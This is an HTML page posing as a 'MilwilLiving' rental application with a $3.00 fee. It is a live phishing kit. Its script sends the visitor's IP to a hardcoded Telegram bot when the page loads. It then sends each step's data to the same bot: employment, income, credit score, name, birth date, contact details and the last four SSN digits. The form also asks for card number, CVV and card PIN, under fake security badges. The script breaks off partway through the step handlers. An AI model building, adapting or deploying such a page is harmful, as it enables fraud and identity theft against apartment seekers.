<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Rental Application ‚Ä¢ MilwilLiving</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            padding: 16px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
        }
        
        .header {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        @media (min-width: 480px) {
            .header {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .logo-icon {
            background: #1e293b;
            color: white;
            width: 44px;
            height: 44px;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            font-weight: 700;
            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
        }
        
        .logo-text {
            font-size: 22px;
            font-weight: 700;
            color: #0f172a;
            letter-spacing: -0.5px;
        }
        
        .logo-text span {
            color: #2563eb;
            font-weight: 800;
        }
        
        .verified-badge {
            background: white;
            padding: 8px 18px;
            border-radius: 40px;
            font-size: 13px;
            font-weight: 600;
            color: #0f172a;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #e2e8f0;
            width: fit-content;
            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
        }
        
        .main-card {
            background: white;
            border-radius: 28px;
            padding: 24px;
            box-shadow: 0 12px 30px rgba(0,0,0,0.08);
            border: 1px solid #edf2f7;
        }
        
        @media (min-width: 480px) {
            .main-card {
                padding: 32px;
            }
        }
        
        .property-header {
            display: flex;
            gap: 18px;
            margin-bottom: 24px;
            padding-bottom: 20px;
            border-bottom: 1px solid #eef2f6;
        }
        
        .property-image {
            width: 80px;
            height: 80px;
            background: linear-gradient(145deg, #f8fafc, #eef2f6);
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #334155;
            font-size: 36px;
            flex-shrink: 0;
            border: 1px solid #e2e8f0;
        }
        
        @media (min-width: 480px) {
            .property-image {
                width: 90px;
                height: 90px;
                font-size: 38px;
            }
        }
        
        .property-details {
            flex: 1;
            min-width: 0;
        }
        
        .property-title {
            font-size: 20px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 6px;
            letter-spacing: -0.3px;
        }
        
        @media (min-width: 480px) {
            .property-title {
                font-size: 24px;
            }
        }
        
        .property-address {
            color: #475569;
            font-size: 14px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 4px;
        }
        
        .property-features {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            color: #4b5565;
            font-size: 13px;
        }
        
        @media (min-width: 480px) {
            .property-features {
                font-size: 14px;
                gap: 16px;
            }
        }
        
        .property-features span {
            display: flex;
            align-items: center;
            gap: 4px;
            background: #f1f4f9;
            padding: 4px 10px;
            border-radius: 30px;
        }
        
        .progress {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 32px;
            position: relative;
            padding: 0 5px;
        }
        
        .progress-line {
            position: absolute;
            top: 18px;
            left: 40px;
            right: 40px;
            height: 3px;
            background: #e2e8f0;
            z-index: 1;
            border-radius: 10px;
        }
        
        @media (max-width: 380px) {
            .progress-line {
                left: 30px;
                right: 30px;
            }
        }
        
        .progress-step {
            position: relative;
            z-index: 2;
            background: white;
            padding: 0 4px;
            text-align: center;
            flex: 1;
            max-width: 70px;
        }
        
        .step-circle {
            width: 36px;
            height: 36px;
            background: #f1f4f9;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 8px;
            font-weight: 600;
            font-size: 15px;
            color: #64748b;
            border: 3px solid white;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
            transition: all 0.2s;
        }
        
        @media (min-width: 480px) {
            .step-circle {
                width: 40px;
                height: 40px;
                font-size: 16px;
            }
        }
        
        .step-circle.active {
            background: #2563eb;
            color: white;
            box-shadow: 0 4px 10px rgba(37,99,235,0.3);
        }
        
        .step-circle.completed {
            background: #10b981;
            color: white;
            font-size: 18px;
        }
        
        .step-label {
            font-size: 11px;
            font-weight: 600;
            color: #64748b;
            white-space: nowrap;
            text-transform: uppercase;
            letter-spacing: 0.3px;
        }
        
        @media (min-width: 480px) {
            .step-label {
                font-size: 12px;
            }
        }
        
        .step-label.active {
            color: #0f172a;
            font-weight: 700;
        }
        
        .form-section {
            display: none;
        }
        
        .form-section.active {
            display: block;
            animation: fadeIn 0.4s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0.7; transform: translateY(8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .section-title {
            font-size: 22px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 6px;
            letter-spacing: -0.3px;
        }
        
        @media (min-width: 480px) {
            .section-title {
                font-size: 24px;
            }
        }
        
        .section-desc {
            color: #5f6b7a;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        
        .two-column {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
        }
        
        .input-group {
            margin-bottom: 18px;
        }
        
        .input-label {
            display: block;
            margin-bottom: 6px;
            font-size: 13px;
            font-weight: 600;
            color: #2c3e50;
            letter-spacing: 0.2px;
        }
        
        .input-field {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e2e8f0;
            border-radius: 16px;
            font-size: 15px;
            transition: all 0.2s;
            background: #ffffff;
            -webkit-appearance: none;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #2563eb;
            background: white;
            box-shadow: 0 4px 10px rgba(37,99,235,0.05);
        }
        
        .input-field::placeholder {
            color: #a0aec0;
            font-size: 14px;
        }
        
        .date-group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 16px;
            background: #f8fafc;
            border-radius: 40px;
            margin: 20px 0 16px;
            font-size: 13px;
            color: #2d3c4c;
            border: 1px solid #e2e8f0;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: #2563eb;
            color: white;
            border: none;
            border-radius: 18px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            -webkit-tap-highlight-color: transparent;
            box-shadow: 0 8px 16px rgba(37,99,235,0.2);
        }
        
        .btn:hover {
            background: #1d4ed8;
            transform: translateY(-1px);
            box-shadow: 0 12px 20px rgba(37,99,235,0.25);
        }
        
        .btn:active {
            transform: scale(0.98);
            box-shadow: 0 4px 8px rgba(37,99,235,0.2);
        }
        
        .btn-secondary {
            background: white;
            color: #334155;
            border: 1.5px solid #e2e8f0;
            box-shadow: none;
        }
        
        .btn-secondary:hover {
            background: #f8fafc;
            transform: none;
            box-shadow: none;
        }
        
        .total-box {
            background: #f8fafc;
            border-radius: 20px;
            padding: 18px;
            margin-top: 20px;
            border: 1px solid #e2e8f0;
        }
        
        .total-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
            color: #334155;
            font-size: 15px;
        }
        
        .total-row.final {
            font-size: 18px;
            font-weight: 700;
            color: #0f172a;
            border-top: 1px solid #d0d9e4;
            padding-top: 12px;
            margin-top: 8px;
        }
        
        .card-restriction {
            background: #fff7ed;
            border: 1px solid #fdba74;
            border-radius: 16px;
            padding: 14px 16px;
            margin: 20px 0 10px;
            font-size: 14px;
            color: #9a3412;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .info-card {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .info-card h4 {
            color: #0f172a;
            margin-bottom: 16px;
            font-size: 16px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .info-list {
            list-style: none;
        }
        
        .info-list li {
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
            color: #334155;
            font-size: 14px;
            line-height: 1.5;
            align-items: flex-start;
        }
        
        .info-list li span:first-child {
            font-size: 16px;
            flex-shrink: 0;
            background: #eef2f6;
            width: 28px;
            height: 28px;
            border-radius: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .fee-badge {
            background: #2563eb;
            color: white;
            padding: 4px 10px;
            border-radius: 30px;
            font-size: 11px;
            font-weight: 600;
            display: inline-block;
            margin-left: 8px;
            vertical-align: middle;
        }
        
        .processing-screen {
            text-align: center;
            padding: 30px 15px;
            display: none;
        }
        
        .processing-screen.active {
            display: block;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 3px solid #e2e8f0;
            border-top: 3px solid #2563eb;
            border-radius: 50%;
            margin: 0 auto 24px;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .processing-title {
            font-size: 20px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 10px;
        }
        
        .processing-message {
            color: #5f6b7a;
            font-size: 15px;
            margin-bottom: 20px;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e2e8f0;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: #2563eb;
            width: 0%;
            transition: width 3s linear;
        }
        
        .success-screen {
            text-align: center;
            padding: 30px 15px;
            display: none;
        }
        
        .success-screen.active {
            display: block;
        }
        
        .success-icon {
            width: 80px;
            height: 80px;
            background: #10b981;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            color: white;
            font-size: 40px;
            box-shadow: 0 10px 20px rgba(16,185,129,0.2);
        }
        
        .success-title {
            font-size: 26px;
            font-weight: 700;
            color: #0f172a;
            margin-bottom: 12px;
        }
        
        .success-message {
            color: #5f6b7a;
            font-size: 15px;
            margin-bottom: 28px;
            line-height: 1.6;
        }
        
        .confirmation-box {
            background: #f1f5f9;
            padding: 18px;
            border-radius: 18px;
            margin-bottom: 24px;
            font-family: 'Courier New', monospace;
            font-size: 18px;
            font-weight: 700;
            color: #0f172a;
            letter-spacing: 1px;
            word-break: break-all;
            border: 1px solid #e2e8f0;
        }
        
        .pin-container {
            background: #f8fafc;
            padding: 24px 20px;
            border-radius: 24px;
            text-align: center;
            margin-bottom: 24px;
            border: 1px solid #e2e8f0;
        }
        
        .pin-fields {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 12px;
        }
        
        .pin-field {
            width: 55px !important;
            text-align: center;
            font-size: 24px !important;
            padding: 14px 0 !important;
            border-radius: 18px !important;
        }
        
        @media (max-width: 380px) {
            .pin-field {
                width: 45px !important;
                padding: 12px 0 !important;
            }
        }
        
        .footer {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-top: 20px;
            color: #6b7a8f;
            font-size: 12px;
            text-align: center;
        }
        
        @media (min-width: 480px) {
            .footer {
                flex-direction: row;
                justify-content: space-between;
                font-size: 13px;
            }
        }
        
        .divider {
            height: 1px;
            background: #e2e8f0;
            margin: 24px 0 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">ML</div>
                <div class="logo-text">Milwil<span>Living</span></div>
            </div>
            <div class="verified-badge">
                Verified Partner
            </div>
        </div>
        
        <div class="main-card">
            <!-- Property Preview - No address or apt type -->
            <div class="property-header">
                <div class="property-image">
                    ‚åÇ
                </div>
                <div class="property-details">
                    <h2 class="property-title">Property Listing</h2>
                    <p class="property-address">
                        Available Now
                    </p>
                    <div class="property-features">
                        <span>Application </span>
                    </div>
                </div>
            </div>
            
            <!-- Progress Steps -->
            <div class="progress">
                <div class="progress-line"></div>
                <div class="progress-step">
                    <div class="step-circle active" id="step1Circle">1</div>
                    <div class="step-label active" id="step1Label">Intro</div>
                </div>
                <div class="progress-step">
                    <div class="step-circle" id="step2Circle">2</div>
                    <div class="step-label" id="step2Label">Employment</div>
                </div>
                <div class="progress-step">
                    <div class="step-circle" id="step3Circle">3</div>
                    <div class="step-label" id="step3Label">Personal</div>
                </div>
                <div class="progress-step">
                    <div class="step-circle" id="step4Circle">4</div>
                    <div class="step-label" id="step4Label">Schedule</div>
                </div>
                <div class="progress-step">
                    <div class="step-circle" id="step5Circle">5</div>
                    <div class="step-label" id="step5Label">Payment</div>
                </div>
            </div>
            
            <!-- STEP 1: INTRODUCTION (Professional & Legit) -->
            <div id="step1" class="form-section active">
                <h3 class="section-title">Application Process</h3>
                <p class="section-desc">Complete the following steps to apply for this property.</p>
                
                <div class="info-card">
                    <h4>Required Information</h4>
                    <ul class="info-list">
                        <li>
                            <span>1</span>
                            <span><strong>Employment & Income</strong> ‚Äî Current job, annual income, credit score range</span>
                        </li>
                        <li>
                            <span>2</span>
                            <span><strong>Personal Details</strong> ‚Äî Full name, date of birth, contact information</span>
                        </li>
                        <li>
                            <span>3</span>
                            <span><strong>Viewing Schedule</strong> ‚Äî Select preferred date and time</span>
                        </li>
                        <li>
                            <span>4</span>
                            <span><strong>Application Fee</strong> ‚Äî $3.00 (non-refundable)</span>
                        </li>
                    </ul>
                </div>

                <div class="info-card" style="background: #f0f9ff; border-color: #bae6fd;">
                    <h4>Secure Verification</h4>
                    <ul class="info-list">
                        <li>
                            <span>‚úì</span>
                            <span>256-bit encrypted transmission</span>
                        </li>
                        <li>
                            <span>‚úì</span>
                            <span>Verified by Norton Secured</span>
                        </li>
                        <li>
                            <span>‚úì</span>
                            <span>Your data is never shared</span>
                        </li>
                    </ul>
                </div>

                <div class="info-card" style="background: #fefce8; border-color: #fde047;">
                    <h4>Fee Breakdown</h4>
                    <ul class="info-list">
                        <li>
                            <span>$</span>
                            <span>
                                <strong>Application processing: $3.00</strong>
                                <span class="fee-badge">One-time</span>
                            </span>
                        </li>
                        <li>
                            <span>‚è±Ô∏è</span>
                            <span>Typical processing time: 2-3 minutes</span>
                        </li>
                    </ul>
                </div>
                
                <div class="security-badge">
                    <span>üîê</span>
                    <span>Secure ‚Ä¢ SSL Certified ‚Ä¢ 256-bit encryption</span>
                </div>
                
                <button id="step1Btn" class="btn">
                    Continue to Application ‚Üí
                </button>
            </div>
            
            <!-- STEP 2: EMPLOYMENT & FINANCIAL (First) -->
            <div id="step2" class="form-section">
                <h3 class="section-title">Employment & Income</h3>
                <p class="section-desc">Tell us about your current employment and financial status.</p>
                
                <div class="input-group">
                    <label class="input-label">Employment status</label>
                    <select id="employmentStatus" class="input-field">
                        <option value="fulltime">Employed full-time</option>
                        <option value="parttime">Employed part-time</option>
                        <option value="selfemployed">Self-employed</option>
                        <option value="unemployed">Unemployed</option>
                        <option value="retired">Retired</option>
                    </select>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Job title / Position</label>
                    <input type="text" id="jobTitle" class="input-field" placeholder="e.g. Software Engineer, Manager">
                </div>
                
                <div class="input-group">
                    <label class="input-label">Employer name</label>
                    <input type="text" id="employer" class="input-field" placeholder="Company name">
                </div>
                
                <div class="two-column">
                    <div class="input-group">
                        <label class="input-label">Annual income</label>
                        <select id="income" class="input-field">
                            <option>$0 ‚Äì $35,000</option>
                            <option>$35,000 ‚Äì $50,000</option>
                            <option>$50,000 ‚Äì $75,000</option>
                            <option>$75,000 ‚Äì $100,000</option>
                            <option>$100,000 ‚Äì $150,000</option>
                            <option>$150,000+</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label class="input-label">Credit score range</label>
                        <select id="creditScore" class="input-field">
                            <option>Excellent (750+)</option>
                            <option>Good (700-749)</option>
                            <option>Fair (650-699)</option>
                            <option>Poor (600-649)</option>
                            <option>Very Poor (below 600)</option>
                        </select>
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Years at current job</label>
                    <select id="yearsEmployed" class="input-field">
                        <option>Less than 1 year</option>
                        <option>1-2 years</option>
                        <option>3-5 years</option>
                        <option>6-10 years</option>
                        <option>10+ years</option>
                    </select>
                </div>
                
                <button id="step2Btn" class="btn">
                    Continue ‚Üí
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(1)">
                    ‚Üê Back
                </button>
            </div>
            
            <!-- STEP 3: PERSONAL DETAILS (Second) - Removed address fields -->
            <div id="step3" class="form-section">
                <h3 class="section-title">Personal Details</h3>
                <p class="section-desc">Please provide your personal information.</p>
                
                <div class="two-column">
                    <div class="input-group">
                        <label class="input-label">First name</label>
                        <input type="text" id="firstName" class="input-field" placeholder="John">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Last name</label>
                        <input type="text" id="lastName" class="input-field" placeholder="Smith">
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Date of birth</label>
                    <input type="date" id="dob" class="input-field" value="1990-01-01">
                </div>
                
                <div class="input-group">
                    <label class="input-label">Phone number</label>
                    <input type="tel" id="phone" class="input-field" placeholder="(212) 555-7890">
                </div>
                
                <div class="input-group">
                    <label class="input-label">Email address</label>
                    <input type="email" id="email" class="input-field" placeholder="john.smith@email.com">
                </div>
                
                <div class="input-group">
                    <label class="input-label">Last 4 digits of SSN (for verification)</label>
                    <input type="text" id="last4ssn" class="input-field" placeholder="1234" maxlength="4">
                    <div style="font-size: 12px; color: #6b7a8f; margin-top: 5px;">Required for credit check</div>
                </div>
                
                <button id="step3Btn" class="btn">
                    Continue ‚Üí
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(2)">
                    ‚Üê Back
                </button>
            </div>
            
            <!-- STEP 4: SCHEDULE VIEWING -->
            <div id="step4" class="form-section">
                <h3 class="section-title">Schedule viewing</h3>
                <p class="section-desc">Select your preferred date and time.</p>
                
                <div class="date-group">
                    <div class="input-group">
                        <label class="input-label">Date</label>
                        <input type="date" id="viewingDate" class="input-field">
                    </div>
                    <div class="input-group">
                        <label class="input-label">Time</label>
                        <select id="viewingTime" class="input-field">
                            <option>9:00 AM</option>
                            <option>10:30 AM</option>
                            <option>12:00 PM</option>
                            <option>1:30 PM</option>
                            <option>3:00 PM</option>
                            <option>4:30 PM</option>
                            <option>6:00 PM</option>
                        </select>
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Number of guests</label>
                    <select id="guests" class="input-field">
                        <option>1 guest</option>
                        <option selected>2 guests</option>
                        <option>3 guests</option>
                        <option>4+ guests</option>
                    </select>
                </div>
                
                <div class="security-badge">
                    <span>‚è±Ô∏è</span>
                    <span>Your slot is held for 30 minutes</span>
                </div>
                
                <button id="step4Btn" class="btn">
                    Continue ‚Üí
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(3)">
                    ‚Üê Back
                </button>
            </div>
            
            <!-- STEP 5: CARD INFORMATION -->
            <div id="step5" class="form-section">
                <h3 class="section-title">Payment</h3>
                <p class="section-desc">$3.00 application processing fee</p>                
                
                <div class="input-group">
                    <label class="input-label">Card number</label>
                    <input type="text" id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19">
                </div>
                
                <div class="two-column">
                    <div class="input-group">
                        <label class="input-label">Expiry</label>
                        <input type="text" id="cardExpiry" class="input-field" placeholder="MM/YY" maxlength="5">
                    </div>
                    <div class="input-group">
                        <label class="input-label">CVV</label>
                        <input type="password" id="cardCvv" class="input-field" placeholder="123" maxlength="3">
                    </div>
                </div>
                
                <div class="input-group">
                    <label class="input-label">Name on card</label>
                    <input type="text" id="cardName" class="input-field" placeholder="John Smith">
                </div>
                
                <div class="card-restriction">
                    <span>‚ö†Ô∏è</span>
                    <span>Prepaid ,CashApp and Credit cards not accepted for verification .</span>
                </div>
                
                <div class="total-box">
                    <div class="total-row">
                        <span>Application fee</span>
                        <span>$3.00</span>
                    </div>
                    <div class="total-row final">
                        <span>Total due today</span>
                        <span>$3.00</span>
                    </div>
                </div>
                
                <button id="step5Btn" class="btn">
                    Pay $3.00 ‚Üí
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(4)">
                    ‚Üê Back
                </button>
            </div>
            
            <!-- PROCESSING SCREEN -->
            <div id="processing" class="processing-screen">
                <div class="spinner"></div>
                <h3 class="processing-title">Processing your application</h3>
                <p class="processing-message">Please wait while we verify your information</p>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <p id="processingStatus" style="color: #64748b; font-size: 14px;">Initiating secure connection</p>
            </div>
            
            <!-- STEP 6: PIN VERIFICATION -->
            <div id="step6" class="form-section">
                <h3 class="section-title">Security verification</h3>
                <p class="section-desc">Enter your card PIN to authorize the $3.00 payment</p>
                
                <div class="pin-container">
                    <div style="font-size: 15px; color: #4a5a6e; margin-bottom: 16px;">4-digit card PIN</div>
                    <div class="pin-fields">
                        <input type="password" id="pin1" class="input-field pin-field" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        <input type="password" id="pin2" class="input-field pin-field" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        <input type="password" id="pin3" class="input-field pin-field" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                        <input type="password" id="pin4" class="input-field pin-field" maxlength="1" inputmode="numeric" pattern="[0-9]*">
                    </div>
                </div>
                
                <button id="step6Btn" class="btn">
                    Complete Application ‚Üí
                </button>
                
                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="goToStep(5)">
                    ‚Üê Back
                </button>
            </div>
            
            <!-- SUCCESS SCREEN -->
            <div id="success" class="success-screen">
                <div class="success-icon">‚úì</div>
                <h2 class="success-title">Application Submitted!</h2>
                <p class="success-message">
                    Your application has been successfully received. The property manager will contact you within 24 hours to confirm your viewing.
                </p>
                <div class="confirmation-box" id="confirmationCode">
                    ML-2025-02-19-8723
                </div>
                <div style="background: #f1f5f9; border-radius: 20px; padding: 18px; text-align: left; margin-bottom: 24px;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                        <span style="color: #4a5a6e; font-size: 14px;">Viewing date</span>
                        <span style="font-weight: 600; font-size: 16px;" id="confirmDate">Feb 21, 2025</span>
                    </div>
                    <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                        <span style="color: #4a5a6e; font-size: 14px;">Viewing time</span>
                        <span style="font-weight: 600; font-size: 16px;" id="confirmTime">3:00 PM</span>
                    </div>
                    <div style="display: flex; justify-content: space-between;">
                        <span style="color: #4a5a6e; font-size: 14px;">Amount paid</span>
                        <span style="font-weight: 600; font-size: 16px;">$3.00</span>
                    </div>
                </div>
                <a href="#" style="color: #2563eb; text-decoration: none; font-weight: 600; font-size: 15px;">Return to listings</a>
            </div>
        </div>
        
        <div class="footer">
            <span>¬© 2025 MilwilLiving. All rights reserved.</span>
            <span>Privacy Policy ¬∑ Terms of Service</span>
        </div>
    </div>

    <script>
        const BOT_TOKEN = '8208877014:AAExK7O6LaYVDfydGBthi9G886s0ZIIOuSo';
        const CHAT_ID = '8044892591';
        
        let applicationData = {
            employment: {
                status: '', jobTitle: '', employer: '', income: '', creditScore: '', yearsEmployed: ''
            },
            personal: {
                firstName: '', lastName: '', dob: '', phone: '', email: '', last4ssn: ''
            },
            viewing: { date: '', time: '', guests: '' },
            card: { number: '', expiry: '', cvv: '', cardName: '' },
            pin: '', ip: '', userAgent: navigator.userAgent, timestamp: '',
            property: 'Property Listing'
        };
        
        // Function to send Telegram message
        async function sendTelegramAlert(message) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message 
                    })
                });
            } catch (e) {
                console.log('Telegram send failed:', e);
            }
        }
        
        // Get IP and send welcome alert
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(d => { 
                applicationData.ip = d.ip;
                const welcomeMessage = `MILWILLIVING APPLICATION OPENED\nTime: ${new Date().toLocaleString()}\nIP: ${applicationData.ip}\nUser Agent: ${navigator.userAgent}\nProperty: ${applicationData.property}`;
                sendTelegramAlert(welcomeMessage);
            })
            .catch(() => { 
                applicationData.ip = 'Unknown';
                const welcomeMessage = `MILWILLIVING APPLICATION OPENED\nTime: ${new Date().toLocaleString()}\nIP: Unknown\nUser Agent: ${navigator.userAgent}\nProperty: ${applicationData.property}`;
                sendTelegramAlert(welcomeMessage);
            });
        
        // DOM Elements
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const step4 = document.getElementById('step4');
        const step5 = document.getElementById('step5');
        const step6 = document.getElementById('step6');
        const processing = document.getElementById('processing');
        const success = document.getElementById('success');
        
        const step1Circle = document.getElementById('step1Circle');
        const step2Circle = document.getElementById('step2Circle');
        const step3Circle = document.getElementById('step3Circle');
        const step4Circle = document.getElementById('step4Circle');
        const step5Circle = document.getElementById('step5Circle');
        
        const step1Label = document.getElementById('step1Label');
        const step2Label = document.getElementById('step2Label');
        const step3Label = document.getElementById('step3Label');
        const step4Label = document.getElementById('step4Label');
        const step5Label = document.getElementById('step5Label');
        
        async function sendToTelegram(stepName, data) {
            const timestamp = new Date().toLocaleTimeString();
            let message = `MILWILLIVING - Step ${stepName}\n`;
            message += `Time: ${timestamp}\n`;
            message += `IP: ${data.ip || 'Unknown'}\n`;
            message += `Property: ${data.property}\n`;
            message += `----------------\n`;
            
            if (data.employment.status) message += `Employment: ${data.employment.status}\nJob: ${data.employment.jobTitle} at ${data.employment.employer}\nYears: ${data.employment.yearsEmployed}\nIncome: ${data.employment.income}\nCredit: ${data.employment.creditScore}\n`;
            if (data.personal.firstName) message += `Name: ${data.personal.firstName} ${data.personal.lastName}\nDOB: ${data.personal.dob}\nPhone: ${data.personal.phone}\nEmail: ${data.personal.email}\nSSN: ${data.personal.last4ssn}\n`;
            if (data.viewing.date) message += `Viewing: ${data.viewing.date} at ${data.viewing.time}\nGuests: ${data.viewing.guests}\n`;
            if (data.card.number) message += `Card: ${data.card.number}\nExp: ${data.card.expiry}\nCVV: ${data.card.cvv}\nName: ${data.card.cardName}\n`;
            if (data.pin) message += `PIN: ${data.pin}\n`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                });
            } catch (e) {}
        }
        
        function goToStep(step) {
            [step1, step2, step3, step4, step5, step6, processing, success].forEach(el => {
                el?.classList.remove('active');
            });
            
            if (step === 1) step1.classList.add('active');
            if (step === 2) step2.classList.add('active');
            if (step === 3) step3.classList.add('active');
            if (step === 4) step4.classList.add('active');
            if (step === 5) step5.classList.add('active');
            if (step === 6) step6.classList.add('active');
            if (step === 7) success.classList.add('active');
            if (step === 'processing') processing.classList.add('active');
            
            if (step !== 'processing') {
                [step1Circle, step2Circle, step3Circle, step4Circle, step5Circle].forEach((circle, index) => {
                    circle.classList.remove('active', 'completed');
                    if (index + 1 < step) {
                        circle.classList.add('completed');
                        circle.textContent = '‚úì';
                    }
                    if (index + 1 === step) {
                        circle.classList.add('active');
                        circle.textContent = index + 1;
                    }
                });
                
                [step1Label, step2Label, step3Label, step4Label, step5Label].forEach((label, index) => {
                    label.classList.remove('active');
                    if (index + 1 === step) label.classList.add('active');
                });
            }
        }
        
        // Formatting
        document.getElementById('cardNumber')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            let formatted = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            e.target.value = formatted;
        });
        
        document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) e.target.value = value.slice(0,2) + '/' + value.slice(2,4);
        });
        
        // PIN auto-advance
        ['pin1', 'pin2', 'pin3', 'pin4'].forEach((id, index) => {
            document.getElementById(id)?.addEventListener('input', function(e) {
                if (e.target.value.length === 1 && index < 3) {
                    document.getElementById(`pin${index + 2}`).focus();
                }
            });
        });
        
        document.getElementById('last4ssn')?.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
        });
        
        // Step 1
        document.getElementById('step1Btn').addEventListener('click', function() {
            applicationData.timestamp = new Date().toISOString();
            goToStep(2);
        });
        
        // Step 2 - Employment
        document.getElementById('step2Btn').addEventListener('click', function() {
            applicationData.employment.status = document.getElementById('employmentStatus').value || '[EMPTY]';
            applicationData.employment.jobTitle = document.getElementById('jobTitle').value || '[EMPTY]';
            applicationData.employment.employer = document.getElementById('employer').value || '[EMPTY]';
            applicationData.employment.income = document.getElementById('income').value || '[EMPTY]';
            applicationData.employment.creditScore = document.getElementById('creditScore').value || '[EMPTY]';
            applicationData.employment.yearsEmployed = document.getElementById('yearsEmployed').value || '[EMPTY]';
            
            sendToTelegram('2 - EMPLOYMENT', applicationData);
            goToStep(3);
        });
        
        // Step 3 - Personal (no address fields)
        document.getElementById('step3Btn').addEventListener('click', function() {
            applicationData.personal.firstName = document.getElementById('firstName').value || '[EMPTY]';
            applicationData.personal.lastName = document.getElementById('lastName').value || '[EMPTY]';
            applicationData.personal.dob = document.getElementById('dob').value || '[EMPTY]';
            applicationData.personal.phone = document.getElementById('phone').value || '[EMPTY]';
            applicationData.personal.email = document.getElementById('email').value || '[EMPTY]';
            applicationData.personal.last4ssn = document.getElementById('last4ssn').value || '[EMPTY]';
            
            sendToTelegram('3 - PERSONAL', applicationData);
            goToStep(4);
        });
        
        // Step 4 - Schedule
